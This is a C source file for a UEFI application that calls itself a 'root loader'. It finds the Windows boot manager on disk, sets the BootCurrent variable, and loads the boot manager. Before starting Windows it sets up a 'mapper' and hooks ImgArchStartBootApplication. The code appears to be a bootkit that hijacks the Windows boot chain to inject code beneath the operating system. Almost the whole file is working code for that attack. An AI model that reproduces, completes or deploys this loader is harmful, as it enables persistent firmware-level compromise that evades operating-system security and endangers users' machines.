#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/PrintLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/DevicePathLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Guid/GlobalVariable.h>
#include "defs.h"
#include "utils.h"
#include "hooks.h"
#include "mapper.h"

#define WINDOWS_BOOTMGR_PATH L"\\efi\\microsoft\\boot\\bootmgfw.efi"

EFI_STATUS EFIAPI GetWindowsBootmgrDevicePath(EFI_DEVICE_PATH** DevicePath) {
    *DevicePath = NULL;

    // get file system handles
    EFI_HANDLE* Handles;
    UINTN HandleCount;
    EFI_STATUS Status = gBS->LocateHandleBuffer(
        ByProtocol, &gEfiSimpleFileSystemProtocolGuid, NULL, &HandleCount, &Handles);
    if (EFI_ERROR(Status))
        return Status;
    
    // find windows bootmgr
    for (UINTN i = 0; i < HandleCount; i++) {
        EFI_FILE_IO_INTERFACE* FileSystem;
        Status = gBS->OpenProtocol(
            Handles[i], &gEfiSimpleFileSystemProtocolGuid,
            (VOID **)&FileSystem, gImageHandle, NULL, EFI_OPEN_PROTOCOL_GET_PROTOCOL);
        if (EFI_ERROR(Status)) continue;
        
        EFI_FILE_HANDLE Volume;
        Status = FileSystem->OpenVolume(FileSystem, &Volume);
        if (!EFI_ERROR(Status)) {
            EFI_FILE_HANDLE File;
            Status = Volume->Open(Volume, &File,
                WINDOWS_BOOTMGR_PATH, EFI_FILE_MODE_READ, EFI_FILE_READ_ONLY);
            if (!EFI_ERROR(Status)) {
                Volume->Close(File);
                *DevicePath = FileDevicePath(Handles[i], WINDOWS_BOOTMGR_PATH);
            }
        }
        
        gBS->CloseProtocol(Handles[i], &gEfiSimpleFileSystemProtocolGuid, gImageHandle, NULL);
        if (*DevicePath) {
            Status = EFI_SUCCESS;
            break;
        }
    }

    return Status;
}

EFI_STATUS EFIAPI SetBootCurrentToWindowsBootmgr() {
    // get boot order
    UINTN BootOrderSize = 0;
    EFI_STATUS Status = gRT->GetVariable(
        EFI_BOOT_ORDER_VARIABLE_NAME, &gEfiGlobalVariableGuid, NULL, &BootOrderSize, NULL);
    if (Status != EFI_BUFFER_TOO_SMALL)
        return Status;
    UINT16* BootOrder = AllocatePool(BootOrderSize);
    if (!BootOrder)
        return EFI_OUT_OF_RESOURCES;
    Status = gRT->GetVariable(
        EFI_BOOT_ORDER_VARIABLE_NAME, &gEfiGlobalVariableGuid, NULL, &BootOrderSize, BootOrder);
    if (EFI_ERROR(Status)) {
        FreePool(BootOrder);
        return Status;
    }

    // find windows bootmgr in boot order
    BOOLEAN Found = FALSE;
    for (UINTN i = 0; i < BootOrderSize / sizeof(UINT16); i++) {
        // get boot option
        CHAR16 VarName[256];
        UnicodeSPrint(VarName, sizeof(VarName), L"Boot%04x", BootOrder[i]);
        UINTN BootOptionSize = 0;
        Status = gRT->GetVariable(VarName, &gEfiGlobalVariableGuid, NULL, &BootOptionSize, NULL);
        if (Status != EFI_BUFFER_TOO_SMALL) continue;
        EFI_LOAD_OPTION *BootOption = AllocatePool(BootOptionSize);
        if (!BootOption) continue;
        Status = gRT->GetVariable(VarName, &gEfiGlobalVariableGuid, NULL, &BootOptionSize, BootOption);
        if (EFI_ERROR(Status)) {
            FreePool(BootOption);
            continue;
        }

        // get file path
        CHAR16* BootOptionDescription = (CHAR16*)((UINT8*)BootOption + sizeof(EFI_LOAD_OPTION));
        EFI_DEVICE_PATH_PROTOCOL* BootOptionPaths = (EFI_DEVICE_PATH_PROTOCOL*)(
            BootOptionDescription + StrLen(BootOptionDescription) + 1);
        if (!BootOption->FilePathListLength) {
            FreePool(BootOption);
            continue;
        }
        CHAR16* BootOptionPath = ConvertDevicePathToText(&BootOptionPaths[0], FALSE, TRUE);
        if (!BootOptionPath) {
            FreePool(BootOption);
            continue;
        }
        ToLower(BootOptionPath);
        
        // check if it contains windows bootmgr path
        if (!StrStr(BootOptionPath, WINDOWS_BOOTMGR_PATH)) {
            FreePool(BootOptionPath);
            FreePool(BootOption);
            continue;
        }

        // set boot current
        Status = gRT->SetVariable(
            EFI_BOOT_CURRENT_VARIABLE_NAME,
            &gEfiGlobalVariableGuid,
            EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
            sizeof(UINT16), &BootOrder[i]);
        if (EFI_ERROR(Status)) {
            FreePool(BootOptionPath);
            FreePool(BootOption);
            continue;
        }

        // found
        Found = TRUE;
        PrintLog(L"[+] windows boot order found and set to current at index %d\r\n", i);
        FreePool(BootOptionPath);
        FreePool(BootOption);
        break;
    }

    FreePool(BootOrder);
    return Found ? EFI_SUCCESS : EFI_NOT_FOUND;
}

EFI_STATUS EFIAPI UefiMain(
    IN EFI_HANDLE ImageHandle,
    IN EFI_SYSTEM_TABLE* SystemTable)
{
    gST->ConOut->ClearScreen(gST->ConOut);
    PrintLog(L"[+] root loader started\r\n");
    
    // get windows bootmgr
    EFI_DEVICE_PATH* WindowsBootmgrDevicePath = NULL;
    EFI_STATUS Status = GetWindowsBootmgrDevicePath(&WindowsBootmgrDevicePath);
    if (EFI_ERROR(Status)) {
        PrintLog(L"[-] cannot find windows bootmgr: %x\r\n", Status);
        gBS->Stall(SEC_TO_MICRO(5));
        return EFI_NOT_FOUND;
    }
    PrintLog(L"[+] windows bootmgr found\r\n");

    // set current boot
    Status = SetBootCurrentToWindowsBootmgr();
    if (EFI_ERROR(Status)) {
        PrintLog(L"[-] cannot set boot current to windows bootmgr: %x\r\n", Status);
        FreePool(WindowsBootmgrDevicePath);
        gBS->Stall(SEC_TO_MICRO(5));
        return Status;
    }
    PrintLog(L"[+] windows bootmgr set to current\r\n");

    // load windows bootmgr
    EFI_HANDLE WindowsBootmgrHandle;
    Status = gBS->LoadImage(
        TRUE, ImageHandle, WindowsBootmgrDevicePath, NULL, 0, &WindowsBootmgrHandle);
    FreePool(WindowsBootmgrDevicePath);
    if (EFI_ERROR(Status)) {
        PrintLog(L"[-] cannot load windows bootmgr: %x\r\n", Status);
        gBS->Stall(SEC_TO_MICRO(5));
        return Status;
    }
    PrintLog(L"[+] windows bootmgr loaded\r\n");

    // setup mapper
    Status = InitMapper(ImageHandle);
    if (EFI_ERROR(Status)) {
        PrintLog(L"[-] cannot setup mapper: %x\r\n", Status);
        gBS->Stall(SEC_TO_MICRO(5));
        return Status;
    }
    PrintLog(L"[+] mapper set: %p, %x\r\n", MappingContent, MappingSize);

    // setup hook
    Status = HookImgArchStartBootApplication(WindowsBootmgrHandle);
    if (EFI_ERROR(Status)) {
        PrintLog(L"[-] cannot hook ImgArchStartBootApplication: %x\r\n", Status);
        gBS->Stall(SEC_TO_MICRO(5));
        return Status;
    }
    PrintLog(L"[+] ImgArchStartBootApplication hooked\r\n");

    // start windows bootmgr
    PrintLog(L"[+] starting windows bootmgr...\r\n");
    Status = gBS->StartImage(WindowsBootmgrHandle, NULL, NULL);
    if (EFI_ERROR(Status)) {
        PrintLog(L"[-] cannot start windows bootmgr: %x\r\n", Status);
        gBS->UnloadImage(WindowsBootmgrHandle);
        gBS->Stall(SEC_TO_MICRO(5));
        return Status;
    }

    return EFI_SUCCESS;
}
